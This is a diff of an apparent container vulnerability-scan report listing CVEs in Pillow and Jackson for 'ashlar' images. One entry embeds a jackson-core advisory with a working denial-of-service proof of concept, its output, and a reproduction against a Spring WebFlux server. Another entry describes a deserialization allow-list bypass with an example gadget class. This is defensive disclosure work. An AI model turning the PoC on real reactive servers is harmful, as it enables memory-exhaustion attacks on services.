+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59205",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3453.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/a9ffc42bedf4fc0a7ef8d6486e7f9e81e3397721",
+            "https://github.com/python-pillow/Pillow/pull/9715",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-9hw9-ch79-4vh6",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59205",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59205"
+          ],
+          "PublishedDate": "2026-07-14T16:17:02.37Z",
+          "LastModifiedDate": "2026-07-14T20:09:27.77Z"
         }
       ],
-      "vulnerability_count": 9
+      "vulnerability_count": 20
     },
     "1.19.0": {
       "image": "ghcr.io/bundlecore/products/bfx/ashlar:1.19.0",
@@ -700,6 +1548,52 @@
           "LastModifiedDate": "2026-06-17T09:37:27.057Z"
         },
         {
+          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/ashlar/jars/bioformats_package.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.14.2",
+            "UID": "f800698b925b0138"
+          },
+          "InstalledVersion": "2.14.2",
+          "FixedVersion": "2.18.8, 2.21.4, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:7436ba1576345123b0c8606ea76548d6a9e553166b70decce14722c6b6409f54",
+          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr >= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr >= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr >= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) & 0xFF;\n        if (ch < INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch > INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // <-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch >= INT_0 && ch <= INT_9) {\n        ++fractLen;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr >= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // <-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc && cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat > PoC.java <<'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c < 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux<DataBuffer>` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       <- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono<JsonNode>` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /\nWebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr >= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
+            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
+            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
+            "https://github.com/FasterXML/jackson-core/pull/1611",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+          ],
+          "PublishedDate": "2026-07-21T21:58:53Z",
+          "LastModifiedDate": "2026-07-21T21:58:53Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-54512",
           "VendorIDs": [
             "GHSA-j3rv-43j4-c7qm"
@@ -725,7 +1619,7 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:75d840d931d07a5d89b0e56d4737ba2767e449105c5e8305577c98e03fe5f367",
-          "Title": "jackson-databind contains the general-purpose data-binding functionali ...",
+          "Title": "jackson-databind: jackson-databind: Arbitrary code execution via PolymorphicTypeValidator bypass",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's PolymorphicTypeValidator (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains <), DatabindContext._resolveAndValidateGeneric() validates only the raw container class name (the substring before <) against the configured PTV. If the container type is approved, the method parses the full canonical type string via TypeFactory.constructFromCanonical() and returns the fully parameterized type without ever validating the nested type arguments against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization. An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example java.util.ArrayList<com.evil.Gadget> when only java.util.ArrayList is allow-listed. The container passes the PTV check; com.evil.Gadget is loaded via Class.forName(name, true, loader), instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "HIGH",
           "CweIDs": [
@@ -733,19 +1627,42 @@
             "CWE-502"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "alma": 3,
+            "amazon": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
               "V3Score": 8.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/security/cve/CVE-2026-54512",
+            "https://bugzilla.redhat.com/2492010",
+            "https://bugzilla.redhat.com/2492015",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
+            "https://errata.almalinux.org/9/ALSA-2026-40895.html",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
-            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm"
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm",
+            "https://linux.oracle.com/cve/CVE-2026-54512.html",
+            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54512",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54512"
           ],
           "PublishedDate": "2026-06-23T21:17:02.203Z",
           "LastModifiedDate": "2026-06-27T21:01:36.47Z"
@@ -783,8 +1700,12 @@
             "CWE-184"
           ],
           "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
             "ghsa": 3,
-            "redhat": 3
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -797,8 +1718,29 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:36839",
+            "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:43218",
+            "https://access.redhat.com/errata/RHSA-2026:43400",
+            "https://access.redhat.com/errata/RHSA-2026:44061",
+            "https://access.redhat.com/errata/RHSA-2026:44062",
+            "https://access.redhat.com/errata/RHSA-2026:44063",
+            "https://access.redhat.com/errata/RHSA-2026:44064",
+            "https://access.redhat.com/errata/RHSA-2026:44065",
+            "https://access.redhat.com/errata/RHSA-2026:44066",
+            "https://access.redhat.com/errata/RHSA-2026:44271",
+            "https://access.redhat.com/errata/RHSA-2026:48095",
+            "https://access.redhat.com/errata/RHSA-2026:48151",
             "https://access.redhat.com/security/cve/CVE-2026-54513",
+            "https://bugzilla.redhat.com/2492010",
+            "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
+            "https://errata.almalinux.org/9/ALSA-2026-40895.html",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -806,12 +1748,14 @@
             "https://github.com/FasterXML/jackson-databind/issues/5983",
             "https://github.com/FasterXML/jackson-databind/pull/5984",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-rmj7-2vxq-3g9f",
+            "https://linux.oracle.com/cve/CVE-2026-54513.html",
+            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-54513",
             "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54513.json",
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-06-30T03:21:03.13Z"
+          "LastModifiedDate": "2026-07-30T12:19:02.307Z"
         },
         {
           "VulnerabilityID": "CVE-2021-0341",
@@ -1294,6 +2238,7 @@
             "https://access.redhat.com/errata/RHSA-2026:3461",
             "https://access.redhat.com/errata/RHSA-2026:3462",
             "https://access.redhat.com/errata/RHSA-2026:4128",
+            "https://access.redhat.com/errata/RHSA-2026:42644",
             "https://access.redhat.com/errata/RHSA-2026:4942",
             "https://access.redhat.com/errata/RHSA-2026:5168",
             "https://access.redhat.com/errata/RHSA-2026:5665",
@@ -1318,7 +2263,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-25990"
           ],
           "PublishedDate": "2026-02-11T21:16:20.67Z",
-          "LastModifiedDate": "2026-06-30T03:17:46.933Z"
+          "LastModifiedDate": "2026-07-21T12:17:47.257Z"
         },
         {
           "VulnerabilityID": "CVE-2026-40192",
@@ -1401,6 +2346,10 @@
             "https://access.redhat.com/errata/RHSA-2026:24866",
             "https://access.redhat.com/errata/RHSA-2026:24977",
             "https://access.redhat.com/errata/RHSA-2026:27076",
+            "https://access.redhat.com/errata/RHSA-2026:34365",
+            "https://access.redhat.com/errata/RHSA-2026:34366",
+            "https://access.redhat.com/errata/RHSA-2026:34368",
+            "https://access.redhat.com/errata/RHSA-2026:37275",
             "https://access.redhat.com/security/cve/CVE-2026-40192",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2458856",
             "https://github.com/python-pillow/Pillow",
@@ -1414,7 +2363,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-40192"
           ],
           "PublishedDate": "2026-04-15T23:16:10.053Z",
-          "LastModifiedDate": "2026-06-30T03:19:16.99Z"
+          "LastModifiedDate": "2026-07-20T12:19:05.59Z"
         },
         {
           "VulnerabilityID": "CVE-2026-42311",
@@ -1442,7 +2391,7 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
           "Fingerprint": "sha256:2843359dd71a51026a6a75f09fb75e0659e31721a8efcc011ebbaaeee3b8bf99",
-          "Title": "Pillow is a Python imaging library. From version 10.3.0 to before vers ...",
+          "Title": "Pillow: python-pillow: Pillow: Arbitrary code execution via malicious PSD file processing",
           "Description": "Pillow is a Python imaging library. From version 10.3.0 to before version 12.2.0, processing a malicious PSD file could lead to memory corruption, potentially resulting in a crash or arbitrary code execution. This issue has been patched in version 12.2.0.",
           "Severity": "HIGH",
           "CweIDs": [
@@ -1454,6 +2403,7 @@
             "bitnami": 3,
             "ghsa": 3,
             "nvd": 3,
+            "redhat": 3,
             "ubuntu": 2
           },
           "CVSS": {
@@ -1468,9 +2418,14 @@
             "nvd": {
               "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
               "V3Score": 7.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42311",
             "https://github.com/python-pillow/Pillow",
             "https://github.com/python-pillow/Pillow/commit/58f9a1d166dcb0c274807d4423522d205b0c35ea",
             "https://github.com/python-pillow/Pillow/pull/9520",
@@ -1482,7 +2437,748 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-42311"
           ],
           "PublishedDate": "2026-05-09T06:16:10.43Z",
-          "LastModifiedDate": "2026-06-17T10:47:40.52Z"
+          "LastModifiedDate": "2026-07-24T21:10:00.143Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54058",
+          "VendorIDs": [
+            "GHSA-62p4-gmf7-7g93"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54058",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:7796a176d8eacf4a5ba399bf38b87b67a60ff1185c84b2d79892fa1670253cd3",
+          "Title": "Pillow: Pillow: Memory disclosure or denial of service via crafted McIdas AREA image",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, when Pillow loads an uncompressed McIdas AREA image from a filename through the mmap raw codec path, attacker-controlled header words can set a row stride smaller than the natural row width, causing pixel access such as Image.tobytes(), getpixel, convert, or save to read beyond the mapped region and disclose adjacent process memory or fault. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-125"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+              "V3Score": 9.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-54058",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/6a8de891fb00968e5ea79bfa84368ed90b3cfc1d",
